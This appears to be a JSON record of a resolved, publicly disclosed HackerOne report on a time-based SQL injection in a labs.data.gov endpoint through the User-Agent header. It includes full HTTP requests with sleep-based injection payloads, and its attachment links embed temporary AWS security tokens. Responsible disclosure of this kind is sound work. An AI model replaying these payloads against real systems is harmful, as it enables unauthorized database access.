@@ -1,0 +1,219 @@
+{
+  "id": 297478,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTc0Nzg=",
+  "url": "https://hackerone.com/reports/297478",
+  "title": "SQL injection in https://labs.data.gov/dashboard/datagov/csv_to_json via User-agent ",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2017-12-13T11:26:28.370Z",
+  "submitted_at": "2017-12-13T11:26:28.370Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "harisec",
+    "url": "/harisec",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/003/968/7f3126cb24b0dd55034e93fb7e809df7e1000e77_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 50592,
+    "url": "https://hackerone.com/gsa_bbp",
+    "handle": "gsa_bbp",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/iyPFgzbsX86VXw5wJHyfPg9s/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/iyPFgzbsX86VXw5wJHyfPg9s/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "GSA Bounty",
+      "twitter_handle": null,
+      "website": "http://gsa.gov",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2019-03-22T16:02:56.793Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-03-22T16:02:56.698Z",
+  "team_member_agreed_on_going_public_at": "2019-03-22T15:53:36.090Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I've identified an SQL injection vulnerability in the website  **labs.data.gov** that affects the endpoint `/dashboard/datagov/csv_to_json` and can be exploited via the **User-Agent** HTTP header.\n\nI didn't extracted any data from the database, I've confirmed the vulnerability using **sleep** SQL queries with various arithmetic operations. The **sleep** command combined with the arithmetic operations will cause the server to sleep for various amounts of time depending on the result of the arithmetic operation.\n\nFor example, setting the value `Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5),0))OR'` to the `User-Agent` header will cause the server to sleep for **25 (5*5)** seconds.\n\nTo reproduce, send the following HTTPS request:\n\n```\nGET /dashboard/datagov/csv_to_json HTTP/1.1\nReferer: 1\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5),0))OR'\nX-Forwarded-For: 1\nX-Requested-With: XMLHttpRequest\nHost: labs.data.gov\nConnection: Keep-alive\nAccept-Encoding: gzip,deflate\nAccept: */*\n\n```\n\nThe server will respond after **25 (5*5)** seconds - same as the value of the `User-Agent:` header.\n\nNow, let's cause the server to respond immediately. We will send the value **sleep(5*5*0)** that is equivalent with **0**.\n\n```\nGET /dashboard/datagov/csv_to_json HTTP/1.1\nReferer: 1\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5*0),0))OR'\nX-Forwarded-For: 1\nX-Requested-With: XMLHttpRequest\nHost: labs.data.gov\nConnection: Keep-alive\nAccept-Encoding: gzip,deflate\nAccept: */*\n\n```\nThe server responded immediately as **5*5*0 = 0**.\n\nLet's confirm it with another request:\n\n```\nGET /dashboard/datagov/csv_to_json HTTP/1.1\nReferer: 1\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(6*6-30),0))OR'\nX-Forwarded-For: 1\nX-Requested-With: XMLHttpRequest\nHost: labs.data.gov\nConnection: Keep-alive\nAccept-Encoding: gzip,deflate\nAccept: */*\n\n\n```\n\nThis time the payload contains **6*6-30** that is equal with **6**. The server responded after **6** seconds.\n\nThese are just a few of the SQL queries with various arithmetic operations that I've tried to confirm this issue.\n\n## Impact\n\nAn attacker can manipulate the SQL statements that are sent to the MySQL database and inject malicious SQL statements. The attacker is able to change the logic of SQL statements executed against the database.",
+  "weakness": {
+    "id": 67,
+    "name": "SQL Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 246419,
+      "file_name": "sqli-labs-data-gov-ua-25sec.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/246/419/58d5fa2e4ecfb7ab0bb8b189304ee42812e4bb80/sqli-labs-data-gov-ua-25sec.png?response-content-disposition=attachment%3B%20filename%3D%22sqli-labs-data-gov-ua-25sec.png%22%3B%20filename%2A%3DUTF-8%27%27sqli-labs-data-gov-ua-25sec.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4EGAVBMQ%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T053620Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIDxsfkE%2FHiPvPAoUWXoH%2BZ8zay2wiII3QGAz12TE3Ok7AiEAugGJi5%2BoG2E5tMUO1t73radNTDR9dsoadoWS4g7ua54qsgUIfhADGgwwMTM2MTkyNzQ4NDkiDOGRAVIzXLeGTUrx6SqPBYG%2B2tsUkslYvUcZ3n16aq1hhT%2FOdCYN68wt3lIyMtZdjcJyQT4uYIIyFoCf6BKHTBo1t%2Fol2vGK2yHc2KqTx7ukypdxti5%2Fa42M1cfxK9%2B6s6i8HnzdrcEmkVwKD5JRfR3QqidJ%2Bl450cLlg%2FBsMtFncK7WtwrpWHwiDRQbIexobtmByG2RVdl%2B1azxuRYxnndwxw6hrnHbw%2F4bhNJDF6EmIy4%2BbUwyuna%2BjjTvWipWuaIiKCwhZQafWk3Xl%2BaRaU3GLg7g8hI8FBUCzCPrzBw6%2Fayl%2B8SBIYXm%2FuxUzOIBjjWOyy2xuvon2s2SWdw3SoYdEJH45ERSYa%2BmFbmwQ5CAavDFF6RTcEM0dd6SxvQHKwtgABdaK7VVwpkIq2unyyGrldc4Z1W9AF7d62HnylWB0Un1jFuErUTJleN5dXsbi7q3eVMDsAbe2jJ43Qo7LYVhcZmy%2BYFZKB4JZ9YyTfDMrK22plI8yK%2B6%2Bnhz%2BsX04aweQ3ocCp1%2Fs1KpFH4rwLhNtTn%2BTG0bI7vT%2BRnI1as1IuGQ5nsMVp0zoo0Fc%2BO%2Fi0T0JetSQnhuey3ujuTOcxtj4VbRSgoWs0nebTR%2Frq82pqR9VVU6VEcU%2FYbsIvYGGqKac8TohTrZoxfMvwQNBj2BsOBGJl3RZSeld6SfiIXKpHFbyhiUxNTu0dfH%2FHvGhCCLkoiUfMNB45BTyvWyt7yBxSY3dvFcQxnmRQ1kw0HJ8zUyMz6Q2%2BqkBufets%2FyIXdVz0kfoFiENqFXWObZBEbqXRUCSboo6Yeu7q8wd79LBV0QMkQjh8e949bRnmHjblJ%2BpwBKZkns6UtH74CjUWlyRHdsWuWai2YwtyrxlFUwebb64Lx05cEuFWl5%2BSwwmLC30gY6sQFFRULRpafaXW4qV9ZEDJ%2B5uMXYP0Vdu16FBu7kKG6dq4LkT9auedFomSp2PLAx2ug3gn9cuNF29scDzK9iGyjhuwBE2bVbWI4gIsa27mvm%2F5ZMNN%2Fam3rJkj6vHlzO9qNrmqJGOrJqCNu4iPbFmK22YAS1Bbwv9CSyu6OFCmw1lKWzZBDRz4yYvlZkefW9R7L4G7l7dy3erw3CIpxOGu0k81W%2BX3u2grhm%2B9rFOBzF2r0%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ebb362591b9ae4f508aedcade56a6423ca9f970d646df6757b6e3511d6968d65",
+      "file_size": 199989,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 246420,
+      "file_name": "sqli-labs-data-gov-ua-9sec.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/246/420/fe4781ce560067a12c7f264c70c900f4a7b46f19/sqli-labs-data-gov-ua-9sec.png?response-content-disposition=attachment%3B%20filename%3D%22sqli-labs-data-gov-ua-9sec.png%22%3B%20filename%2A%3DUTF-8%27%27sqli-labs-data-gov-ua-9sec.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4EGAVBMQ%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T053620Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIDxsfkE%2FHiPvPAoUWXoH%2BZ8zay2wiII3QGAz12TE3Ok7AiEAugGJi5%2BoG2E5tMUO1t73radNTDR9dsoadoWS4g7ua54qsgUIfhADGgwwMTM2MTkyNzQ4NDkiDOGRAVIzXLeGTUrx6SqPBYG%2B2tsUkslYvUcZ3n16aq1hhT%2FOdCYN68wt3lIyMtZdjcJyQT4uYIIyFoCf6BKHTBo1t%2Fol2vGK2yHc2KqTx7ukypdxti5%2Fa42M1cfxK9%2B6s6i8HnzdrcEmkVwKD5JRfR3QqidJ%2Bl450cLlg%2FBsMtFncK7WtwrpWHwiDRQbIexobtmByG2RVdl%2B1azxuRYxnndwxw6hrnHbw%2F4bhNJDF6EmIy4%2BbUwyuna%2BjjTvWipWuaIiKCwhZQafWk3Xl%2BaRaU3GLg7g8hI8FBUCzCPrzBw6%2Fayl%2B8SBIYXm%2FuxUzOIBjjWOyy2xuvon2s2SWdw3SoYdEJH45ERSYa%2BmFbmwQ5CAavDFF6RTcEM0dd6SxvQHKwtgABdaK7VVwpkIq2unyyGrldc4Z1W9AF7d62HnylWB0Un1jFuErUTJleN5dXsbi7q3eVMDsAbe2jJ43Qo7LYVhcZmy%2BYFZKB4JZ9YyTfDMrK22plI8yK%2B6%2Bnhz%2BsX04aweQ3ocCp1%2Fs1KpFH4rwLhNtTn%2BTG0bI7vT%2BRnI1as1IuGQ5nsMVp0zoo0Fc%2BO%2Fi0T0JetSQnhuey3ujuTOcxtj4VbRSgoWs0nebTR%2Frq82pqR9VVU6VEcU%2FYbsIvYGGqKac8TohTrZoxfMvwQNBj2BsOBGJl3RZSeld6SfiIXKpHFbyhiUxNTu0dfH%2FHvGhCCLkoiUfMNB45BTyvWyt7yBxSY3dvFcQxnmRQ1kw0HJ8zUyMz6Q2%2BqkBufets%2FyIXdVz0kfoFiENqFXWObZBEbqXRUCSboo6Yeu7q8wd79LBV0QMkQjh8e949bRnmHjblJ%2BpwBKZkns6UtH74CjUWlyRHdsWuWai2YwtyrxlFUwebb64Lx05cEuFWl5%2BSwwmLC30gY6sQFFRULRpafaXW4qV9ZEDJ%2B5uMXYP0Vdu16FBu7kKG6dq4LkT9auedFomSp2PLAx2ug3gn9cuNF29scDzK9iGyjhuwBE2bVbWI4gIsa27mvm%2F5ZMNN%2Fam3rJkj6vHlzO9qNrmqJGOrJqCNu4iPbFmK22YAS1Bbwv9CSyu6OFCmw1lKWzZBDRz4yYvlZkefW9R7L4G7l7dy3erw3CIpxOGu0k81W%2BX3u2grhm%2B9rFOBzF2r0%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0723c9ee856c3c5e600a718bc8c5616e50bf6b31c75c9938654601d2cace65c0",
+      "file_size": 197825,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 697,
+  "voters": [
+    "pindakaas",
+    "rmmal",
+    "upx",
+    "rioru",
+    "lamber",
+    "boldagihororok",
+    "orange303",
+    "k10kten",
+    "m4khn0",
+    "kekkegenkai",
+    "and 687 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.1,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "high"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "297478",
+  "votes": 697,
+  "latest_disclosable_activity_at": "2019-03-22T16:02:56.812Z",
+  "_metadata": {
+    "saved_at": "2026-07-08T13:36:20.657020",
+    "source": "https://hackerone.com/reports/297478.json",
+    "report_id": 297478
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTc0Nzg=",
+    "databaseId": "297478",
+    "title": "SQL injection in https://labs.data.gov/dashboard/datagov/csv_to_json via User-agent ",
+    "url": "https://hackerone.com/reports/297478",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2019-03-22T16:02:56.793Z",
+    "created_at": "2017-12-13T11:26:28.370Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzY3",
+      "name": "SQL Injection",
+      "external_id": "cwe-89"
+    },
+    "severity": {
+      "rating": "critical",
+      "score": 9.1
+    },
+    "reporter": {
+      "username": "harisec"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzUwNTky",
+      "handle": "gsa_bbp",
+      "name": "GSA Bounty",
+      "url": "https://hackerone.com/gsa_bbp",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS82Njg1MA==",
+            "amount": "0.00",
+            "awarded_amount": "0.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2017-12-13T19:03:21.018Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzI5NzQ3OA==",
+    "_id": "297478",
+    "disclosed": true,
+    "votes": 697,
+    "latest_disclosable_activity_at": "2019-03-22T16:02:56.812Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTc0Nzg=",
+      "databaseId": "297478",
+      "title": "SQL injection in https://labs.data.gov/dashboard/datagov/csv_to_json via User-agent ",
+      "url": "https://hackerone.com/reports/297478",
+      "disclosed_at": "2019-03-22T16:02:56.793Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzUwNTky",
+      "handle": "gsa_bbp",
+      "name": "GSA Bounty",
+      "url": "https://hackerone.com/gsa_bbp",
+      "currency": "usd"
+    }
+  }
+}
